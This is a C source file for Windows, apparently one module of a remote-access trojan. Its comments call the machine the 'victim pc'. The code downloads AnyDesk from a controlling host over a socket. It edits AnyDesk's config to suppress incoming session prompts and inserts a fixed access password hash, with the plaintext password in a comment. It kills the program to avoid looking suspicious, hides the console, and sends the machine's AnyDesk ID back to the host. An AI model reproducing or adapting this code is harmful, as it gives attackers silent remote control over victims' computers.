#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include "Hash.h"

#define BUFFER_SIZE 1024
#define ANYDESK_CODE_ERROR "no-code__" // The code has to be 9 digits
#define SOCKET_CLOSE_ERROR 10
#define ANYDESK_CODE_LENGTH 9

char anyDeskFilePath[MAX_PATH] = { 0 }; // Contains the path to the anydesk file

// Functions
int installAnyDesk(int hostSocket);
void _defineAnyDeskSettings();
char* _getCode();
int sendCode(int hostSocket);
int startsWith(const char* a, const char* b);
int recv_file(int socket, char* fileName);
void powerOffAnyDesk();
void powerOnAnyDesk();


int startsWith(const char* a, const char* b)
{
    if (strncmp(a, b, strlen(b)) == 0)
        return 0;
    return 1;
}

void setAnyDeskFilePath()
{
    /*
    Puts inside [anydeskFilePath] the path to the anydesk file
    */
    
    // Gets "USERPROFILE variable 
    char* buf = NULL;
    size_t sz = 0;
    
    while (_dupenv_s(&buf, &sz, "USERPROFILE") != 0) { // If there is an error
        printf("Can't getting the registery variable: USERPROFILE, trying again in 1 seconds...\n");
        Sleep(1000);
    }

    // Sets the path
    strcpy_s(anyDeskFilePath, sizeof(anyDeskFilePath), buf);
    strcat_s(anyDeskFilePath, sizeof(anyDeskFilePath), "\\Downloads\\anydesk.exe");

    printf("The anydesk file path is: ");
    puts(anyDeskFilePath);

    free(buf);
    
}

int installAnyDesk(int hostSocket)
{
    /*
    Installs anydesk on this pc (victim pc)
 
    return:
    0 - on sucess
    else : error
    */

    //unsigned char hash[MD5_DIGEST_LENGTH];
    //strcpy_s(hash, sizeof(hash), calculateHash(anyDeskFilePath));
    //if (hash == NULL) {
    //    // File not exists
    //}
    

    printf("Installing...\n");

    // Gets the file
    if(recv_file(hostSocket, anyDeskFilePath) == SOCKET_CLOSE_ERROR){
        return SOCKET_CLOSE_ERROR;
    }

    printf("The Installing has been successfully completed!\n");

    printf("Definning settings...\n");
    _defineAnyDeskSettings();
    printf("The settings have been successfully defined!\n");

    if (sendCode(hostSocket) == SOCKET_ERROR) {
        return SOCKET_ERROR;
    }

    return 0;
}

int recv_file(int socket, char* fileName)
{
    /*
    Recvs file from the socket

    param 1: the socket
    param 2: the name which will be to the file

    return: 
    1 - on error
    else - error
    */

    int fileSize, totalReceived = 0, recvBytesAmount;
    char buffer[BUFFER_SIZE] = { 0 };
    FILE* fp;
    
    while (fopen_s(&fp, fileName, "wb") != 0) {
        printf("Can't open file %s, trying again in 1 seconds...\n", fileName);
        Sleep(1000);
    }

    // Recvs the file size
    if (recv(socket, (char*)&fileSize, sizeof(fileSize), 0) == SOCKET_ERROR)
    {
        printf("Error in file recviving (1)\n");
        fclose(fp);
        remove(fileName);
        return SOCKET_CLOSE_ERROR;
    }
    fileSize = ntohl(fileSize); // Converts to little endian

    printf("Recv file size is %d bytes\n", fileSize);

    // Recvs the file
    while (totalReceived < fileSize)
    {
        recvBytesAmount = recv(socket, buffer, sizeof(buffer), 0);
        if (recvBytesAmount == SOCKET_ERROR)
        {
            printf("Error in file recviving (2)\n");
            fclose(fp);
            remove(fileName);
            return SOCKET_CLOSE_ERROR;
        }
        fwrite(buffer, sizeof(char), recvBytesAmount, fp);

        totalReceived += recvBytesAmount;
        printf("recv: %d/%d (%d bytes recv right now)\n", totalReceived, fileSize, recvBytesAmount);
    }

    fclose(fp);
    printf("File has been successfully received!\n");
    return 0;
}

void _defineAnyDeskSettings()
{
    /*
    Defines the requried anydesk settins by editting the anydesk files
    */

    char ANYDESK_FOLDER_PATH[MAX_PATH], ANYDESK_SYSTEM_FILE_PATH[MAX_PATH], ANYDESK_SERVICE_FILE_PATH[MAX_PATH], fileLine[2048] = { 0 };
    int lineIndex = 0, attemptsAmount = 0;
    FILE* ANYDESK_SYSTEM_FILE, * ANYDESK_SERVICE_FILE;

    // Launch anydesk
    powerOnAnyDesk();

    // Gets the APPDATA variable name
    char* buf = NULL;
    size_t sz = 0;
    while (_dupenv_s(&buf, &sz, "APPDATA") != 0) {
        printf("Can't getting the registery variable: APPDATA, trying again in 1 seconds...\n");
        Sleep(1000);
    }

    // Gets the path of the anydesk folder
    strcpy_s(ANYDESK_FOLDER_PATH, sizeof(ANYDESK_FOLDER_PATH), buf);
    free(buf);
    strcat_s(ANYDESK_FOLDER_PATH, sizeof(ANYDESK_FOLDER_PATH), "\\AnyDesk");

    // The path to the system file
    strcpy_s(ANYDESK_SYSTEM_FILE_PATH, sizeof(ANYDESK_SYSTEM_FILE_PATH), ANYDESK_FOLDER_PATH);
    strcat_s(ANYDESK_SYSTEM_FILE_PATH, sizeof(ANYDESK_SYSTEM_FILE_PATH), "\\system.conf");

    // Waits for the anydesk files to be written
    char* code = _getCode();
    
   
    while (strcmp(code, ANYDESK_CODE_ERROR) == 0)
    {
        if (attemptsAmount == 0) {
           
        }
        else if (attemptsAmount % 5 == 0)
        {
            powerOffAnyDesk();
            printf("Reopening anydesk and trying again...\n");
            powerOnAnyDesk();
        }
        else if (attemptsAmount % 25 == 0)
        {
            // If there is no internet 
            Sleep(60000); // Wating one minute
            printf("Probably there is not internet, trying again in 1 minute...\n");
        }
        

        attemptsAmount++;
        printf("anydesk files have not been already writeen. trying again in 10 Second\n");
        Sleep(10000);
        free(code);
        code = _getCode();
    }

    printf("Anydesk files have been writeen..\n");
    // Kills anydesk (Do not want to look suspicious)
    powerOffAnyDesk();

    // Changes the interactive_access to 2 ("Never show incomming session requests")

    while (fopen_s(&ANYDESK_SYSTEM_FILE, ANYDESK_SYSTEM_FILE_PATH, "r+") != 0) { // If can't open the file
        printf("Can't open the file %s, trying again in 10 seconds...\n", ANYDESK_SYSTEM_FILE_PATH);
        Sleep(10000);
    }

    // Find the index of this line
    while (fscanf_s(ANYDESK_SYSTEM_FILE, "%s", fileLine, sizeof(fileLine)) != -1)
    {

        if (startsWith(fileLine, "ad.security.interactive_access=") == 0)
        {
            break;
        }
        lineIndex += strlen(fileLine);
        lineIndex++; // strlen doesn't count \n
    }

    // Changes the actual line
    fseek(ANYDESK_SYSTEM_FILE, lineIndex, 0);
    fputs("ad.security.interactive_access=2\n", ANYDESK_SYSTEM_FILE);

    fclose(ANYDESK_SYSTEM_FILE);

    // Sets the password to "MatanExtreme1346790"

    // The path to the service file
    strcpy_s(ANYDESK_SERVICE_FILE_PATH, sizeof(ANYDESK_SERVICE_FILE_PATH), ANYDESK_FOLDER_PATH);
    strcat_s(ANYDESK_SERVICE_FILE_PATH, sizeof(ANYDESK_SERVICE_FILE_PATH), "\\service.conf");

    if(fopen_s(&ANYDESK_SERVICE_FILE, ANYDESK_SERVICE_FILE_PATH, "r+") != 0) {
        // If there is an error
        printf("Can't open the file %s, trying again in 10 seconds...\n", ANYDESK_SERVICE_FILE_PATH);
        Sleep(10000);
    }

    // Appends the password for the connecton
    fseek(ANYDESK_SERVICE_FILE, 0, SEEK_END);
    fputs("ad.anynet.pwd_hash=7af0eb0f951a8d1c4d2b57d975a121ef06bb34fb21722e0e3a600c29bc4907a6\n", ANYDESK_SERVICE_FILE);
    fseek(ANYDESK_SERVICE_FILE, 0, SEEK_END);
    fputs("ad.anynet.pwd_salt=7d4a31e9bc00511a79e719476634488f\n", ANYDESK_SERVICE_FILE);

    fclose(ANYDESK_SERVICE_FILE); 
    free(code);
}

char* _getCode()
{
    /*
    Returns the anydesk code of this pc
    */

    char ANYDESK_SYSTEM_FILE_PATH[MAX_PATH], fileLine[1024] = { 0 };
    FILE* ANYDESK_SYSTEM_FILE = NULL;
    char* code = calloc(ANYDESK_CODE_LENGTH + 1, sizeof(char));

    // Gets "APPDATA variable 
    char* buf = NULL;
    size_t sz = 0;
    while (_dupenv_s(&buf, &sz, "APPDATA") != 0) {
        printf("Can't getting the registery variable: APPDATA, trying again in 1 seconds...\n");
        Sleep(1000);
    }

    // Gets the path of the anydesk system file
    strcpy_s(ANYDESK_SYSTEM_FILE_PATH, sizeof(ANYDESK_SYSTEM_FILE_PATH), buf);
    strcat_s(ANYDESK_SYSTEM_FILE_PATH, sizeof(ANYDESK_SYSTEM_FILE_PATH), "\\AnyDesk\\system.conf");


    while (fopen_s(&ANYDESK_SYSTEM_FILE, ANYDESK_SYSTEM_FILE_PATH, "rb") != 0) {
        // If there is an error
        printf("Can't open the file %s, trying again in 10 seconds...\n", ANYDESK_SYSTEM_FILE_PATH);
        Sleep(10000);
    }


    // Gets the code
    while (fscanf_s(ANYDESK_SYSTEM_FILE, "%s", fileLine, sizeof(fileLine)) != -1)
    {
        if (startsWith(fileLine, "ad.anynet.id=") == 0)
        {
            int codeStartIndex = 13;
            int codeEndIndex = strlen(fileLine) - 1;

            strncpy_s(code, ANYDESK_CODE_LENGTH + 1, fileLine + codeStartIndex, codeEndIndex - codeStartIndex + 1);
            break;
        }
    }

    if (strlen(code) == 0) {
        strncpy_s(code, sizeof(code), ANYDESK_CODE_ERROR, sizeof(code));
    }

    fclose(ANYDESK_SYSTEM_FILE);
    return code;
}

int sendCode(int hostSocket)
{
    /*
    Sends the anydesk code of this pc to the host

    return:
    0 - on sucess
    else - on error
    */

    // Gets the code
    char* code = _getCode();

    // TODO: do something if there is no code..
    if (strcmp(code, ANYDESK_CODE_ERROR) == 0)
    {
        printf("There is no code...\n");
    }
    else
    {
        printf("Sending code: %s Length: %d \n", code, strlen(code));
    }

    // Sends the code
    if (send(hostSocket, code, strlen(code), 0) == SOCKET_ERROR) {
        printf("Can't sending code: %d \n", GetLastError());
        free(code);
        return SOCKET_ERROR;
    }

    free(code);
    return 0;
}

void powerOnAnyDesk()
{
    /*
    Powers on anydesk
    */

    printf("Powering on...\n");
    //ShellExecuteA(GetDesktopWindow(), "open", "C:\\Users\\Matan\\Downloads\\AnyDesk.exe", NULL, NULL, SW_SHOW);
    ShellExecuteA(NULL, "open", anyDeskFilePath, NULL, NULL, SW_SHOW);


    printf("Anydesk has successfully powered on!\n");
}

void powerOffAnyDesk()
{
    /*
    Powers off anydesk
    */

    printf("Powering off...\n");

    system("TASKKILL /F /IM AnyDesk.exe");
    printf("anydesk has successfully powered off!\n");
}

void hideConsoleWindow()
{
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
}